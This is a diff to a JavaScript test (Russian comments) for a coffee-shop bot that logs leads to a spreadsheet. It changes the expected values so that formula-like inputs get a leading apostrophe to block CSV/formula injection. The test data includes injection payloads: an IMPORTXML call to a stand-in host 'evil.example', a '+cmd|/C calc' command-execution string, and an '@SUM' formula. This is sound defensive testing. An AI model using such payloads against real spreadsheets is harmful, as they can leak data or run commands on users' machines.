@@ -117,9 +117,10 @@ test('новая заявка: строка в таблице (RAW, порядо
     [
       '2026-11-21 11:59 UTC',
       'Бот кофейни',
-      '=IMPORTXML("https://evil.example","//a")',
-      '+cmd|/C calc',
-      '@SUM(A1:A9)',
+      // RAW и апостроф перед значением, похожим на формулу (выгрузка в CSV → Excel).
+      `'=IMPORTXML("https://evil.example","//a")`,
+      "'+cmd|/C calc",
+      "'@SUM(A1:A9)",
       'https://ketner.org/solutions/sol-1',
       'lead-1',
     ],
